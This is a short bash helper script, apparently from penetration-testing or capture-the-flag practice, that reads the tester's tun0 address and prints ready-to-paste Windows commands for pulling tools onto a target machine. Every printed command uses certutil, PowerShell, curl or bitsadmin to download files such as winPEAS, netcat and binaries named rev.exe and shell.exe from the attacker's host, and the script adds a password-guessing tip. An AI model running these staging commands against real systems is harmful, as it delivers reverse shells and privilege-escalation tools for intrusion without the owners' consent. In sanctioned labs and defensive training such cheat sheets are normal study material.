#!/bin/bash

# create an alias `ftw` to invoke this script 

# TUN0IP=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
TUN0IP=$((ifconfig tun0 | awk '/inet /{print $2}') 2>/dev/null)
echo ""
echo "tun0: $TUN0IP"
echo ""
echo "==================================="
echo "      Windows File Transfer"
echo "==================================="
echo ""
echo "certutil -urlcache -f http://$TUN0IP/winPEASx64.exe wp64.exe"
echo "certutil -urlcache -split -f http://$TUN0IP/winPEASx64.exe wp64.exe"
echo "certutil -urlcache -f http://$TUN0IP/winPEAS.bat win.bat"
echo "certutil -urlcache -f http://$TUN0IP/nc64.exe nc.exe"
echo "certutil -urlcache -f http://$TUN0IP/rev.exe rev.exe"
echo "certutil -urlcache -f http://$TUN0IP/shell.exe shell.exe"
echo "powershell.exe wget http://$TUN0IP/winPEASx64.exe -OutFile C:\Temp\wp64.exe"
echo "powershell.exe -command iwr -Uri http://$TUN0IP/winPEASx64.exe -OutFile C:\Temp\wp64.exe"
echo "powershell.exe (New-Object System.Net.WebClient).DownloadFile(\"http://$TUN0IP/nc.exe\",\"C:\Temp\nc.exe\")"
echo "curl -O http://$TUN0IP/nc.exe"
echo "curl http://$TUN0IP/nc.exe -o nc.exe"
echo "bitsadmin /transfer transfName /priority high http://$TUN0IP/nc.exe C:\Temp\nc.exe"
echo ""
echo "-----------------------------------"
echo ""
echo "Try usernames as passwords"
echo "Fix PATH on Windows:"
echo "set PATH=%SystemRoot%\system32;%SystemRoot%;"

echo ""
echo "More at: https://book.hacktricks.xyz/exfiltration"

